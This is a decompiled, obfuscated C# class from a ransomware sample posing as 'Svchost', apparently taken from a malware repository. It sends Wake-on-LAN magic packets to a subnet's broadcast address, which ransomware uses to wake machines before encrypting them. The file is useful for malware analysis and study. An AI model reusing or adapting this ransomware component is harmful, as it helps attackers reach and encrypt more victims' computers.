// Decompiled with JetBrains decompiler
// Type: sWduCclqEzKrM.gWxcHJfAxg
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0EDCE10-9F20-42C9-8790-E70D370F9841
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.Win32.Generic-9bf0633f41d2962ba5e2895ece2ef9fa7b546ada311ca30f330f0d261a7fb184.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace sWduCclqEzKrM
{
  public static class gWxcHJfAxg
  {
    [NonSerialized]
    internal static GetString \u0091;

    public static void HqMnvszZuIVWoI([In] string obj0, [In] string obj1, [In] string obj2)
    {
      UdpClient udpClient = new UdpClient();
      byte[] dgram = new byte[102];
      for (int index = 0; index <= 5; ++index)
        dgram[index] = byte.MaxValue;
      string[] strArray;
      if (obj0.Contains(gWxcHJfAxg.\u0091(107377571)))
        strArray = obj0.Split('-');
      else
        strArray = obj0.Split(':');
      if (strArray.Length != 6)
        throw new ArgumentException(gWxcHJfAxg.\u0091(107377534));
      int num = 6;
      for (int index1 = 0; index1 < 16; ++index1)
      {
        for (int index2 = 0; index2 < 6; ++index2)
          dgram[num + index1 * 6 + index2] = (byte) Convert.ToInt32(strArray[index2], 16);
      }
      IPAddress broadcastAddress = IPAddress.Parse(obj1).GetBroadcastAddress(IPAddress.Parse(obj2));
      udpClient.Send(dgram, dgram.Length, broadcastAddress.ToString(), 3);
    }

    public static IPAddress GetBroadcastAddress([In] this IPAddress obj0, [In] IPAddress obj1)
    {
      byte[] addressBytes1 = obj0.GetAddressBytes();
      byte[] addressBytes2 = obj1.GetAddressBytes();
      if (addressBytes1.Length != addressBytes2.Length)
        throw new ArgumentException(gWxcHJfAxg.\u0091(107377521));
      byte[] address = new byte[addressBytes1.Length];
      for (int index = 0; index < address.Length; ++index)
        address[index] = (byte) ((uint) addressBytes1[index] | (uint) addressBytes2[index] ^ (uint) byte.MaxValue);
      return new IPAddress(address);
    }

    static gWxcHJfAxg() => Strings.CreateGetStringDelegate(typeof (gWxcHJfAxg));
  }
}
